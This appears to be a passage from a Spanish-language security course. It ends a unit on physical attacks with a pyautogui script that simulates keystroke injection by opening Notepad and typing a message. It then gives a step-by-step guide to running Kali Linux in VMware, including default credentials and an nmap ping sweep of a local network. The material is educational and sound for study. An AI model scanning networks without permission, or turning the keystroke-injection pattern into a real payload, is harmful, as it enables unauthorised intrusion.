```bash
pip install pyautogui
```

```python
import pyautogui
import time

time.sleep(2)
pyautogui.hotkey("win", "r")
time.sleep(1)
pyautogui.write("notepad")
pyautogui.press("enter")
time.sleep(1)
pyautogui.write("Ataque físico simulado con Python.")
```

Ejecuta este script y observa cómo se comporta como un ataque simulado.

---

### 📌 Resumen

| Tema                | Descripción clara                                       |
| ------------------- | ------------------------------------------------------- |
| ¿Qué es?            | Ataques que requieren acceso físico al dispositivo      |
| Tipos               | USB malicioso, robo, BIOS, keyloggers, arranque externo |
| Herramientas        | Rubber Ducky, Bash Bunny, Keylogger, Live USB           |
| Protección          | BIOS segura, cifrado, cámaras, control físico           |
| Simulación práctica | Crear un script con Rubber Ducky o Python               |

---

[🔼](#índice)

---

## **792. Instalación de Kali Linux en Vmware**

### 🧠 ¿Qué es Kali Linux?

**Kali Linux** es una distribución basada en Debian especializada en **seguridad informática, pruebas de penetración y análisis forense**. Viene con más de 600 herramientas preinstaladas como **Nmap**, **Metasploit**, **Wireshark**, **Burp Suite**, etc.

---

### 🧰 ¿Qué es VMware?

**VMware Workstation Player** (gratuito para uso personal) es un software que permite crear **máquinas virtuales (VM)** para ejecutar otros sistemas operativos dentro del tuyo. Es como tener una computadora dentro de tu computadora.

---

### ✅ Requisitos previos

#### 🖥️ Requisitos del sistema (mínimos recomendados):

| Recurso        | Recomendado mínimo                                      |
| -------------- | ------------------------------------------------------- |
| RAM            | 4 GB (ideal 8 GB o más)                                 |
| CPU            | Procesador con virtualización habilitada (VT-x o AMD-V) |
| Almacenamiento | Al menos 20 GB libres                                   |
| Sistema host   | Windows 10/11, Linux, macOS                             |

---

### 🔽 Paso 1: Descargar VMware Player

1. Ir a: [https://www.vmware.com/products/workstation-player.html](https://www.vmware.com/products/workstation-player.html)
2. Haz clic en **"Download Now"**.
3. Elige tu sistema (ej. Windows 64-bit).
4. Instala con doble clic (`.exe`) como cualquier programa.

---

### 🐱 Paso 2: Descargar Kali Linux (versión VMware)

> ¡Kali ya ofrece imágenes listas para VMware!

1. Ir a: [https://www.kali.org/get-kali/#kali-virtual-machines](https://www.kali.org/get-kali/#kali-virtual-machines)
2. Bajo “Kali Linux VMware”, haz clic en **Download (64-bit)**.
3. Se descargará un archivo `.7z` con la imagen lista para VMware.

---

### 🧰 Paso 3: Extraer la máquina virtual

1. Usa **7-Zip** o **WinRAR** para descomprimir el archivo `.7z` descargado.
2. Obtendrás una carpeta con archivos como:

   - `Kali-Linux-202X...vmx` (archivo de configuración)
   - `vmdk` (disco duro virtual)

---

### ▶️ Paso 4: Ejecutar Kali en VMware

1. Abre **VMware Workstation Player**.
2. Haz clic en **“Open a Virtual Machine”**.
3. Busca el archivo `.vmx` dentro de la carpeta descomprimida.
4. Haz clic en **"Play virtual machine"**.
5. ¡Listo! Kali Linux iniciará en una ventana.

---

### 🔐 Usuario y contraseña por defecto

- **Usuario**: `kali`
- **Contraseña**: `kali`

> Recomendado: Cambiar contraseña después de iniciar.

---

### 🧪 Ejemplo práctico: Abrir Terminal y escanear red con `nmap`

Una vez en Kali, haz lo siguiente:

#### Abrir terminal (CTRL + ALT + T) y ejecutar:

```bash
nmap -sn 192.168.1.0/24
```

Esto escanea todos los dispositivos activos en tu red local.

---

### 🛠️ ¿Qué puedes hacer ahora?

Con Kali ya funcionando, puedes practicar:

- Ataques en laboratorios (como OWASP Juice Shop o Metasploitable)
- Análisis de vulnerabilidades
- Captura de tráfico con Wireshark
- Uso de herramientas como **Hydra, Nikto, SQLmap, Metasploit**, etc.

---

### 📌 Consejos adicionales

| Consejo                         | Descripción                                      |
| ------------------------------- | ------------------------------------------------ |
| Toma snapshots                  | Guarda el estado de la VM antes de experimentar  |
| Usa modo puente (Bridged) o NAT | Para conectarte a redes externas desde Kali      |
| Actualiza Kali regularmente     | Con `sudo apt update && sudo apt upgrade`        |
| Instala VMware Tools            | Para mejor resolución de pantalla y copiar/pegar |

---

### 🎁 Resumen final

| Paso                 | Descripción                                 |
| -------------------- | ------------------------------------------- |
| 1. Descargar VMware  | Desde el sitio oficial                      |
| 2. Descargar Kali VM | Desde kali.org (versión para VMware)        |
| 3. Extraer y abrir   | Con 7-Zip y luego abrir el `.vmx` en VMware |
| 4. Iniciar Kali      | Usuario: `kali`, Contraseña: `kali`         |
| 5. Practicar         | Usar herramientas de pentesting y seguridad |

---

[🔼](#índice)

---

| **Inicio**         | **atrás 8**                                         | **Siguiente 10**                              |
| ------------------ | --------------------------------------------------- | --------------------------------------------- |
| [🏠](../README.md) | [⏪](./7_8_OWASP_Top_10_Riesgos_en_Aplicaciones.md) | [⏩](./7_10_Seguridad_de_Redes_On_Premise.md) |
